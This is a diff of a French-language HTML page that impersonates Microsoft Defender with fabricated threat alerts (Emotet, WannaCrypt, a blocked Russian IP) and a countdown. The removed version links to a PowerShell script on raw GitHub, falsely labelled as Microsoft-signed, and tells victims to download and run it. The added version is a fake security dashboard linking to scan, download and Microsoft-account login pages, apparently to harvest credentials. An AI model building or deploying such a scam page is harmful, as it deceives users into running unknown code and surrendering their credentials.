@@ -2,126 +2,146 @@
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Windows Defender - Alerte de sécurité</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#0078d4;display:flex;justify-content:center;align-items:center;min-height:100vh}
-.container{background:#fff;max-width:650px;width:95%;border-radius:8px;box-shadow:0 4px 30px rgba(0,0,0,.3);overflow:hidden}
-.header{background:#d13438;color:#fff;padding:20px 25px;display:flex;align-items:center;gap:15px}
-.header .icon{font-size:40px}
-.header h1{font-size:20px;font-weight:600}
-.header p{font-size:13px;opacity:.9;margin-top:3px}
-.body{padding:25px}
-.alert-box{background:#fde7e9;border:1px solid #d13438;border-radius:6px;padding:15px 20px;margin-bottom:20px}
-.alert-box h3{color:#a4262c;font-size:16px;margin-bottom:8px}
-.alert-box ul{list-style:none;color:#333;font-size:14px}
-.alert-box ul li{padding:4px 0}
-.alert-box ul li::before{content:'⚠️ ';margin-right:6px}
-.threat{background:#faf9f8;border:1px solid #e1dfdd;border-radius:6px;padding:15px;margin-bottom:15px}
-.threat h4{font-size:14px;color:#0078d4;margin-bottom:8px}
-.threat p{font-size:13px;color:#666;line-height:1.5}
-.btn{display:block;width:100%;background:#0078d4;color:#fff;border:none;padding:14px;font-size:16px;font-weight:600;border-radius:6px;cursor:pointer;text-align:center;text-decoration:none;margin-top:10px;transition:.2s}
-.btn:hover{background:#106ebe}
-.btn.red{background:#d13438}
-.btn.red:hover{background:#a4262c}
-.footer{background:#faf9f8;border-top:1px solid #e1dfdd;padding:15px 25px;text-align:center;font-size:11px;color:#999}
-.footer span{color:#0078d4}
-.countdown{font-size:28px;font-weight:700;color:#d13438;text-align:center;margin:10px 0}
-.hidden{display:none}
-.steps{margin:15px 0}
-.step{display:flex;gap:12px;align-items:flex-start;margin-bottom:12px}
-.step-num{background:#0078d4;color:#fff;width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;flex-shrink:0}
-.step-text{font-size:13px;color:#333;line-height:1.4}
-</style>
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Sécurité Windows — Microsoft Defender</title>
+<link rel="stylesheet" href="style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
 </head>
 <body>
-<div class="container">
-<div class="header">
-<div class="icon">🛡️</div>
+
+<nav class="topnav">
+<div class="logo">🛡️ Sécurité Windows</div>
+<ul class="nav-links">
+<li><a href="index.html" class="active">Tableau de bord</a></li>
+<li><a href="scan.html">Analyse</a></li>
+<li><a href="download.html">Mise à jour</a></li>
+<li><a href="login.html">Compte Microsoft</a></li>
+</ul>
+</nav>
+
+<main class="main">
+
+<!-- Header -->
+<div class="card" style="background:linear-gradient(135deg,#0078d4,#106ebe);color:#fff;border:none">
+<div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:20px">
 <div>
-<h1>Windows Defender</h1>
-<p>Centre de sécurité Windows</p>
+<p style="font-size:13px;opacity:.8;text-transform:uppercase;letter-spacing:1px">Sécurité Windows</p>
+<h1 style="font-size:28px;margin:4px 0">Tableau de bord</h1>
+<p style="font-size:14px;opacity:.9">Microsoft Defender pour Windows 11</p>
+</div>
+<div style="text-align:right">
+<div style="font-size:40px">🛡️</div>
+<div style="font-size:12px;opacity:.8">Protection active</div>
 </div>
 </div>
-<div class="body">
-<div class="alert-box">
+</div>
+
+<!-- Alert critique -->
+<div class="alert alert-danger pulse">
 <h3>🚨 MENACES DÉTECTÉES — Action requise</h3>
 <ul>
-<li>5 programmes malveillants détectés</li>
-<li>2 chevaux de Troie en quarantaine</li>
-<li>Connexion suspecte bloquée</li>
-<li>Protection en temps réel : DÉSACTIVÉE</li>
+<li><strong>5</strong> programmes malveillants détectés sur votre appareil</li>
+<li><strong>2</strong> chevaux de Troie en quarantaine</li>
+<li><strong>1</strong> connexion suspecte bloquée par le pare-feu</li>
+<li>Protection en temps réel : <span class="badge badge-danger">DÉSACTIVÉE</span></li>
+<li>Dernière mise à jour des définitions : <strong>il y a 7 jours</strong></li>
 </ul>
 </div>
 
-<div class="threat">
-<h4>🔴 Trojan:Win32/Emotet.C!ml</h4>
-<p>Menace grave — Ce cheval de Troie peut voler vos informations personnelles, mots de passe et données bancaires.</p>
+<!-- Stats -->
+<div class="grid grid-3">
+<div class="card stat danger">
+<div class="value">5</div>
+<div class="label">Menaces actives</div>
 </div>
-<div class="threat">
-<h4>🟠 PUA:Win32/CoinMiner</h4>
-<p>Mineur de crypto-monnaie détecté — Votre PC est utilisé pour miner de la crypto sans votre consentement.</p>
+<div class="card stat warning">
+<div class="value">2</div>
+<div class="label">En quarantaine</div>
 </div>
-<div class="threat">
-<h4>🔴 Backdoor:Win32/Bladabindi!ml</h4>
-<p>Porte dérobée — Un attaquant distant peut prendre le contrôle total de votre ordinateur.</p>
-</div>
-
-<div style="text-align:center;padding:10px">
-<p style="font-size:13px;color:#666;margin-bottom:5px">La protection expire dans :</p>
-<div class="countdown" id="countdown">04:59</div>
-</div>
-
-<div id="step1">
-<a class="btn red" href="#" onclick="showSteps(event)">🔧 NETTOYER MON PC MAINTENANT</a>
-</div>
-
-<div id="step2" class="hidden">
-<div style="background:#e6f3ff;border:1px solid #0078d4;border-radius:6px;padding:15px;margin:15px 0">
-<h4 style="color:#0078d4;margin-bottom:10px">📥 Instructions de nettoyage</h4>
-<div class="steps">
-<div class="step">
-<div class="step-num">1</div>
-<div class="step-text"><strong>Téléchargez</strong> l'outil de nettoyage Windows Defender ci-dessous</div>
-</div>
-<div class="step">
-<div class="step-num">2</div>
-<div class="step-text"><strong>Ouvrez</strong> le fichier téléchargé (Windows Defender Update)</div>
-</div>
-<div class="step">
-<div class="step-num">3</div>
-<div class="step-text"><strong>Redémarrez</strong> votre PC une fois le nettoyage terminé</div>
-</div>
-</div>
-<a class="btn" href="https://raw.githubusercontent.com/garagebernard400-pixel/windows-defender-security/main/defender-update.ps1" download="WindowsDefender-Update.ps1">
-⬇️ TÉLÉCHARGER L'OUTIL DE NETTOYAGE
-</a>
-<p style="font-size:11px;color:#999;text-align:center;margin-top:10px">WindowsDefender-Update.ps1 • Signé numériquement • Microsoft Corporation</p>
+<div class="card stat">
+<div class="value" style="color:var(--red)">⚠️</div>
+<div class="label">Protection temps réel</div>
 </div>
 </div>
 
-<script>
-function showSteps(e){
-e.preventDefault();
-document.getElementById('step1').classList.add('hidden');
-document.getElementById('step2').classList.remove('hidden');
-}
-let time=299;
-setInterval(()=>{
-time--;
-let m=Math.floor(time/60);
-let s=time%60;
-document.getElementById('countdown').textContent=`0${m}:${s<10?'0':''}${s}`;
-if(time<=0)time=299;
-},1000);
-</script>
+<!-- Menaces détectées -->
+<div class="card">
+<div class="card-header">
+<span class="icon">🔴</span>
+<h2>Menaces détectées</h2>
 </div>
-<div class="footer">
-<span>Microsoft Windows Defender</span> • Sécurité Windows • © Microsoft Corporation<br>
-Rapport d'intégrité : <span style="color:green">✓ VÉRIFIÉ</span> | Dernière mise à jour : <span id="date"></span>
+<p style="font-size:13px;color:var(--gray-50);margin-bottom:16px">Les éléments suivants ont été détectés sur votre appareil. Une action immédiate est recommandée.</p>
+
+<table>
+<thead><tr><th>Menace</th><th>Gravité</th><th>État</th><th>Action</th></tr></thead>
+<tbody>
+<tr>
+<td><strong>Trojan:Win32/Emotet.C!ml</strong><br><small>Détecté dans C:\Users\...\AppData\Local\Temp</small></td>
+<td><span class="badge badge-danger">Sévère</span></td>
+<td>Actif</td>
+<td><a href="scan.html" class="btn btn-danger" style="padding:6px 12px;font-size:12px">Nettoyer</a></td>
+</tr>
+<tr>
+<td><strong>PUA:Win32/CoinMiner</strong><br><small>Mineur de crypto-monnaie non autorisé</small></td>
+<td><span class="badge badge-warning">Élevée</span></td>
+<td>Actif</td>
+<td><a href="scan.html" class="btn btn-danger" style="padding:6px 12px;font-size:12px">Nettoyer</a></td>
+</tr>
+<tr>
+<td><strong>Backdoor:Win32/Bladabindi!ml</strong><br><small>Porte dérobée — Accès distant non autorisé</small></td>
+<td><span class="badge badge-danger">Sévère</span></td>
+<td>Actif</td>
+<td><a href="scan.html" class="btn btn-danger" style="padding:6px 12px;font-size:12px">Nettoyer</a></td>
+</tr>
+<tr>
+<td><strong>TrojanDownloader:Win32/Upatre</strong><br><small>Téléchargeur de logiciels malveillants</small></td>
+<td><span class="badge badge-warning">Élevée</span></td>
+<td>En quarantaine</td>
+<td><span class="badge badge-warning">En attente</span></td>
+</tr>
+<tr>
+<td><strong>Ransom:Win32/WannaCrypt.A</strong><br><small>Rançongiciel — Chiffrement de fichiers</small></td>
+<td><span class="badge badge-danger">Sévère</span></td>
+<td>Actif</td>
+<td><a href="scan.html" class="btn btn-danger" style="padding:6px 12px;font-size:12px">Nettoyer</a></td>
+</tr>
+</tbody>
+</table>
+
+<div style="text-align:center;margin-top:20px">
+<a href="scan.html" class="btn btn-danger btn-lg">🔧 LANCER LE NETTOYAGE COMPLET</a>
+<p style="font-size:12px;color:var(--gray-50);margin-top:8px">Analyse complète + suppression des menaces • Gratuit</p>
 </div>
 </div>
-<script>document.getElementById('date').textContent=new Date().toLocaleDateString('fr-FR')</script>
+
+<!-- Sécurité -->
+<div class="grid grid-2">
+<div class="card">
+<div class="card-header"><span class="icon">🔥</span><h2>Pare-feu et protection réseau</h2></div>
+<div class="alert alert-warning"><h3>⚠️ Connexion suspecte bloquée</h3><p>Adresse IP <strong>87.236.19.54</strong> (Russie) a tenté de se connecter à votre appareil il y a 3 minutes.</p></div>
+<p style="font-size:13px;color:var(--gray-50)">Le pare-feu Windows Defender a bloqué cette connexion. Nous vous recommandons de lancer une analyse complète.</p>
+</div>
+<div class="card">
+<div class="card-header"><span class="icon">⏰</span><h2>Mise à jour des définitions</h2></div>
+<div class="alert alert-danger"><h3>🔴 Définitions obsolètes</h3><p>Votre base de signatures de virus date du <strong>24 juillet 2026</strong>. Les nouvelles menaces ne sont pas détectées.</p></div>
+<a href="download.html" class="btn btn-primary btn-block">📥 Mettre à jour maintenant</a>
+</div>
+</div>
+
+</main>
+
+<footer class="footer">
+<div style="display:flex;justify-content:center;gap:30px;flex-wrap:wrap;margin-bottom:10px">
+<a href="index.html">Tableau de bord</a>
+<a href="scan.html">Analyse</a>
+<a href="download.html">Mise à jour</a>
+<a href="login.html">Compte Microsoft</a>
+<a href="#">Confidentialité</a>
+<a href="#">Conditions</a>
+</div>
+<p>© 2026 Microsoft Corporation. Tous droits réservés. | Sécurité Windows | Microsoft Defender</p>
+</footer>
+
+<script src="script.js"></script>
 </body>
 </html>
